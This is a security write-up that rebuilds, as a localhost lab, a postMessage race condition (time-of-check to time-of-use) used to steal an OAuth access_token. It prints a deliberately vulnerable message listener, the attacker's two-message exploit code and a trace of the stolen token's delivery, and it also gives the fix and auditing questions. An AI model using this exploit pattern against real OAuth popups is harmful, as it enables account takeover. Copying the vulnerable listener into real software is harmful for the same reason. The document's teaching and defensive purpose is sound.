# A Dance of Two Messages: Stealing an access_token with a postMessage Race Condition

Let's get straight to the main course. Client-side race conditions over `postMessage` are nothing new — Youssef Sammouda (`@samm0uda`) walked through the idea on Critical Thinking Ep. 58 and turned it into a first-party `access_token` theft on Meta that led to account takeover. What nagged at me wasn't the trick itself, it was this: if there's an allowlist check sitting in the middle, how does the token ever reach a *non-allowed* origin?

So I rebuilt a tiny lab from scratch. The thing that clicked while building it: **the value that gets checked and the destination that actually gets used drift apart.** This is that walk, with the lab's real code. I didn't find a new bug on a live target — this is a runnable reconstruction.

## One minute on postMessage

`postMessage` is the one sanctioned way for two windows of different origins to talk, and it ships with **no access control by default**. The only thing you can truly trust: in a message event, `event.origin` is set by the **browser** and can't be forged — but everything inside `event.data` is fully attacker-controlled. Keep that distinction in your head; the whole bug grows out of it.

## The target: a token behind an allowlist check

The provider is an OAuth-style popup with one allowed origin: `http://localhost:5000`. Here's its vulnerable listener — exactly what's in the lab:

```js
// provider/public/provider-vulnerable.html
let k = location.origin;                     // the token's destination: shared + mutable

addEventListener("message", async (event) => {
  const m = JSON.parse(event.data);

  if (m.type === "register") {               // (a) changes the destination, no checks
    k = m.appOrigin;
    return;
  }
  if (m.type === "getToken") {
    k = m.appOrigin;                                       // (1) destination from the payload
    const allowed = await fetch("/api/authorize?origin=" + k)
                      .then(r => r.json()).then(j => j.allowed);  // (2) async check on that string
    if (!allowed) return;
    window.opener.postMessage(                             // (3) k is read AGAIN
      JSON.stringify({ token: USER_TOKEN, state: m.state }), k);
  }
});
```

And the server side — a real round-trip, not an injected `setTimeout` (this matters: the gap has to be natural):

```js
// provider/server.js
const ALLOWLIST = new Set(["http://localhost:5000"]);
// GET /api/authorize?origin=X   ->   { allowed: ALLOWLIST.has(X) }
```

One thing to be explicit about: the provider **never checks `event.origin`.** It compares the `appOrigin` *string the sender put in the payload* against the allowlist, and reuses that same string as the destination `k`. Trusting a payload-supplied origin is itself one of the weaknesses here. But the lab's main point is something else: `k` is **shared** state, it's **re-read** at send time, and `register` can change it at any moment.

## Two walls the provider put up

I'm the attacker, on `http://localhost:4000`.

**First try — ask with my own origin:**
```js
popup.postMessage(JSON.stringify({ type:"getToken", appOrigin: "http://localhost:4000" }), "*");
```
The allowlist check on the string `4000` fails (`allowed:false`), and that's it. No token.

**Second try — ask with the allowed string:**
```js
popup.postMessage(JSON.stringify({ type:"getToken", appOrigin: "http://localhost:5000" }), "*");
```
Now the check on `5000` **passes** and the provider sends the token — but with `targetOrigin = 5000`. My window is `4000`, so the **browser itself** refuses to deliver it:

```
Failed to execute 'postMessage' on 'DOMWindow': The target origin provided
('http://localhost:5000') does not match the recipient window's origin
('http://localhost:4000').
```

Notice what stopped me: **not the allowlist check — that passed.** What kept the token away from me was the browser's `targetOrigin` enforcement, because the destination was `5000` and my window is `4000`. Dead end either way: my own string gets rejected, the allowed string sends to `5000` and the browser won't hand it to me.

## The dance of two messages

Both walls share one way through. The async check opens a **gap**, and `k` is mutable between "check" and "send." So I send the allowed string to pass the check, and **before the send happens** I flip the shared destination back to my own origin:

```js
// attacker/public/attacker.html — scenario 3
popup.postMessage(JSON.stringify({ type:"getToken", appOrigin: "http://localhost:5000" }), "*"); // passes the check
popup.postMessage(JSON.stringify({ type:"register", appOrigin: "http://localhost:4000" }), "*"); // k -> 4000
```

Both messages go out back-to-back. Inside the provider:

```
getToken: k = 5000 ;  fetch("/api/authorize?origin=5000")   <- pending, the server is busy checking
register: k = 4000                                           <- lands here, inside the gap
          check returns: allowed("5000") == true
          window.opener.postMessage(token, k)                <- k is now 4000
browser:  4000 == 4000  -> delivered
```

The check passed for the string `5000`, but the token went out with `targetOrigin = 4000`, and since my window is `4000`, the browser delivered it. **Token received.** I didn't forge any origin and I didn't time anything — because both messages queue before the check resolves, `register` always lands in time. And the delay isn't fake; it's the real round-trip of the check.

## Why it works (one line)

It's a **TOCTOU** (time-of-check to time-of-use): **the value that was checked (`5000`) isn't the destination that was used (`k`, now `4000`).** The race is exploitable only when both hold: (1) the destination is mutable and re-read at send time, and (2) the attacker can change it inside the gap (the `register` message).

## What's faithful, what's simplified

This lab is an **educational reconstruction**, not a line-for-line copy of the Meta bug. To avoid misleading anyone, here's where it's faithful and where it's simplified (based on Youssef's own write-up):

**Faithful:** the core mechanism is identical — a shared, mutable variable (`k`) used as the `targetOrigin`, taken from the **payload** (not `event.origin`), re-read at send time, and changed by a `register` message during an async gap. In the real bug too, `k` comes from the in-message origin (`a.data.origin`), not from `event.origin`.

**Simplified:**
- **The async gap:** in our lab it's the allowlist check; in the real bug the window was the **OAuth token endpoint request**, and `k` was re-read when that response was delivered.
- **The `register` itself:** in our lab `register` sets `k` with no check; in the real bug `register` ran a server check and only set `k` if the URL was allowed — the attacker passed it with `fbconnect://success`, a valid redirect_uri. We folded that role into `getToken(5000)`.
- **Timing:** because the OAuth window was wide, Youssef waited ~1 second before the second `register`; our gap is tiny, so we fire both messages at once.
- **The fix:** Meta's real fix was a **lock variable (`s`)**; ours is more fundamental (trust `event.origin` + drop the shared state).

> About the "~5MB payload" trick: that's a **general** race-winning technique Youssef uses for *other, tighter* client-side races — **not part of this `k` bug**, whose window was naturally wide (the OAuth request), so it needed no widening.

## The fix

```js
// provider/public/provider-fixed.html
const ALLOW = new Set(["http://localhost:5000"]);
addEventListener("message", (event) => {
  const origin = event.origin;          // (1) browser-set, unforgeable
  const m = JSON.parse(event.data);
  if (!m || m.type !== "getToken") return;
  if (!ALLOW.has(origin)) return;       // (2) synchronous check on the real origin
  window.opener.postMessage(            // (3) use that same checked origin
    JSON.stringify({ token: USER_TOKEN, state: m.state }), origin);
});
```

This closes **both** weaknesses: it stops trusting the payload string and decides on the unforgeable `event.origin`, and it removes the shared destination and the async gap (a local value, a sync check). All three scenarios above fail.

## If you want to hunt for it

Three questions while reading a `message` listener:
- Does the send destination come from `event.origin`, or from stored/payload state?
- Is there async work between picking the destination and sending the token?
- Can a second message change that destination inside the gap?

Three "yes"es and you're probably looking at an ATO. Tool: Frans Rosén's **postMessage-tracker** to enumerate listeners.

## Wrapping up

What makes this bug scary is that none of its parts is a disaster alone: an allowlist check that passes, a variable that looks reasonable, and a delivery the browser performs correctly. They only collapse once timing is added and the checked value splits from the destination. Next time you see an OAuth popup handing a token back over postMessage, ask those three questions.

Thanks to Youssef Sammouda for the original technique and to the Critical Thinking team for documenting it.

---

## Sources
- Critical Thinking – Bug Bounty Podcast, Ep. 58 (Youssef Sammouda).
- ysamm.com — "More secure Facebook Canvas Part 2" (the `k` variable, the register message, `fbconnect://success`, the `s` lock).
- MDN: `Window.postMessage()` security notes.
